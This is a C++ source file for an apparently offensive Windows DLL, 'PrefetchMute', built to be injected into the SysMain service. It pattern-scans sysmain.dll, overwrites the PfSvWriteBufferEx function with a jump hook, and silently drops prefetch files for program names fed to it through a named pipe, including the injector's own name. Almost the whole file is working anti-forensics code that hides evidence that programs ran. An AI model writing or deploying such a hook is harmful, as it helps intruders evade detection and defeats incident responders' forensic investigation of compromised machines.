#include "pch.h"
#include <stdio.h>
#include <windows.h>
#include <string>
#include <string.h>
#include <cstring>
#include <tdh.h>
#include <psapi.h>
#include <evntcons.h>
#include <tlhelp32.h>
#include <vector>

#include "prefetchmute.h"

#define PATTERN "\x48\x89\x5c\x24\x08\x48\x89\x6c\x24\x10\x48\x89\x74\x24\x18\x57\x41\x54\x41\x55\x41\x56\x41\x57\x48\x83\xec\x50\x45\x0f\xb7\xd1\x41\x8b\xc1"

#pragma comment (lib, "psapi.lib")
#pragma comment (lib, "tdh.lib")
#pragma comment (lib, "ws2_32.lib")
#pragma comment (lib, "crypt32.lib")

CHAR* cRule;
LPVOID lpCallbackOffset;
CHAR   OriginalBytes[50] = {};


struct filter_rule {
	CHAR item[200];
};
std::vector<filter_rule> filterList;





VOID HookPfSvWriteBufferEx()
{
	/*
	Hook the original PfSvWriteBufferEx to redirect it to ours.
	*/

	DWORD oldProtect, oldOldProtect;

	unsigned char boing[] = { 0x49, 0xbb, 0xde, 0xad, 0xc0, 0xde, 0xde, 0xad, 0xc0, 0xde, 0x41, 0xff, 0xe3 };

	*(void**)(boing + 2) = &PfSvWriteBufferExHook;

	VirtualProtect(lpCallbackOffset, 13, PAGE_EXECUTE_READWRITE, &oldProtect);
	memcpy(lpCallbackOffset, boing, sizeof(boing));
	VirtualProtect(lpCallbackOffset, 13, oldProtect, &oldOldProtect);
	return;
}

VOID DoOriginalPfSvWriteBufferEx(LPCWSTR param_1, LPCVOID param_2, DWORD param_3, unsigned int param_4)
{

	/*
	Restore the original PfSvWriteBufferEx and then call it.
	This will report whatever event is stored in the param EventRecord.
	*/

	DWORD dwOldProtect;

	VirtualProtect(lpCallbackOffset, sizeof(OriginalBytes), PAGE_EXECUTE_READWRITE, &dwOldProtect);
	memcpy(lpCallbackOffset, OriginalBytes, sizeof(OriginalBytes));
	VirtualProtect(lpCallbackOffset, sizeof(OriginalBytes), dwOldProtect, &dwOldProtect);
	PfSvWriteBufferEx_ PfSvWriteBufferEx = (PfSvWriteBufferEx_)lpCallbackOffset;
	try
	{
		PfSvWriteBufferEx(param_1, param_2, param_3, param_4);
	}
	catch (int e)
	{

	}
	HookPfSvWriteBufferEx();
}


int WINAPI PfSvWriteBufferExHook(LPCWSTR param_1, LPCVOID param_2, DWORD param_3, unsigned int param_4) {
	size_t i;
	CHAR name[500];
	char fullPIDLogFilePath[1024];
	CHAR cStringBuffer[500];
	wcstombs_s(&i, name, (size_t)500, param_1, (size_t)500);
	//Iterate through our filter list and check if there is a substring. If so, just exit
	for (int i = 0; i < filterList.size(); i++)
	{
		if (strstr(name, filterList.at(i).item))
		{
			sprintf_s(fullPIDLogFilePath, "[+] Found hidden file: %s | Ignoring\n", name);
			OutputDebugStringA(fullPIDLogFilePath);
			memset(fullPIDLogFilePath, '\0', strlen(fullPIDLogFilePath));
			return -1;
		}
	}
	sprintf_s(fullPIDLogFilePath, "[i] Creating prefetch file: %s\n", name);
	OutputDebugStringA(fullPIDLogFilePath);
	memset(fullPIDLogFilePath, '\0', strlen(fullPIDLogFilePath));
	DoOriginalPfSvWriteBufferEx(param_1, param_2, param_3, param_4);
	return 0;

}

DWORD WINAPI UpdateFilterList(LPVOID lpParam)
{
	CHAR* cBuffer;
	DWORD  dwPipeRead;
	DWORD  dwHeapSize = 31337;
	HANDLE HeapHandle, hPipe;
	CHAR cStringBuffer[200];
	HeapHandle = GetProcessHeap();

	cRule = (CHAR*)HeapAlloc(HeapHandle, HEAP_ZERO_MEMORY, dwHeapSize);
	cBuffer = (CHAR*)HeapAlloc(HeapHandle, HEAP_ZERO_MEMORY, dwHeapSize);

	hPipe = CreateNamedPipeA("\\\\.\\pipe\\Prefetch_Rule_Pipe", PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
		1,
		31337,
		31337,
		NMPWAIT_USE_DEFAULT_WAIT,
		NULL);
	while (hPipe != INVALID_HANDLE_VALUE)
	{
		if (ConnectNamedPipe(hPipe, NULL) != FALSE)
		{

			ZeroMemory(cRule, strlen(cRule));

			while (ReadFile(hPipe, cBuffer, sizeof(cBuffer) - 1, &dwPipeRead, NULL) != FALSE)
			{
				cBuffer[dwPipeRead] = '\0';
				sprintf(cRule, "%s%s", cRule, cBuffer);
			}


		}
		//Convert to uppercase for Prefetch file name format
		for (int i = 0; i < sizeof(cRule); i++)
		{
			cRule[i] = std::toupper(cRule[i]);
		}
		filter_rule temp;
		sprintf_s(temp.item, "%s", (cRule));
		//Add to our filter list and disconnect our named pipe
		filterList.push_back(temp);
		DisconnectNamedPipe(hPipe);
		ZeroMemory(cRule, strlen(cRule));

	}

	return 0;
}

BOOL PlaceHook()
{
	/*
	Find the base address of sysmain.
	Then scan (base address + 0xfffff) for the pattern.
	When the offset is found call the hooking function.
	*/
	DWORD_PTR dwBase;
	DWORD i, dwSizeNeeded;
	CHAR cStringBuffer[200];
	HMODULE hModules[102400];
	TCHAR   szModule[MAX_PATH];
	DWORD oldProtect, oldOldProtect;

	if (EnumProcessModules(GetCurrentProcess(), hModules, sizeof(hModules), &dwSizeNeeded))
	{
		for (int i = 0; i < (dwSizeNeeded / sizeof(HMODULE)); i++)
		{
			ZeroMemory((PVOID)szModule, MAX_PATH);
			if (GetModuleBaseNameA(GetCurrentProcess(), hModules[i], (LPSTR)szModule, sizeof(szModule) / sizeof(TCHAR)))
			{
				if (!strcmp("sysmain.dll", (const char*)szModule))
				{
					dwBase = (DWORD_PTR)hModules[i];
				}
			}
		}
	}
	//sprintf_s(cStringBuffer, "[i] Base Address: 0x%llx\n", dwBase);
	//OutputDebugStringA(cStringBuffer);
	//memset(cStringBuffer, '\0', strlen(cStringBuffer));
	for (i = 0; i < 0xfffff; i++)
	{
		if (!memcmp((PVOID)(dwBase + i), (unsigned char*)PATTERN, strlen(PATTERN)))
		{
			lpCallbackOffset = (LPVOID)(dwBase + i);

			//sprintf_s(cStringBuffer, "[i] Offset: 0x%llx\n", lpCallbackOffset);
			//OutputDebugStringA(cStringBuffer);
			//memset(cStringBuffer, '\0', strlen(cStringBuffer));

			memcpy(OriginalBytes, lpCallbackOffset, 50);
			HookPfSvWriteBufferEx();

			return TRUE;
		}
	}
	return FALSE;
}


VOID PrefetchMuteMain()
{

	filter_rule meta_rule;
	sprintf_s(meta_rule.item, "%s", "PREFETCHMUTEINJECTOR");
	filterList.push_back(meta_rule);
	//Place the hook

	DWORD dwTid;
	HANDLE hThread;
	hThread = CreateThread(0, 0, UpdateFilterList, NULL, 0, &dwTid);
	if (!PlaceHook())
	{
		goto CLEANUP;
	}

	goto CLEANUP;

CLEANUP:
	CloseHandle(hThread);
	return;
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		PrefetchMuteMain();
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}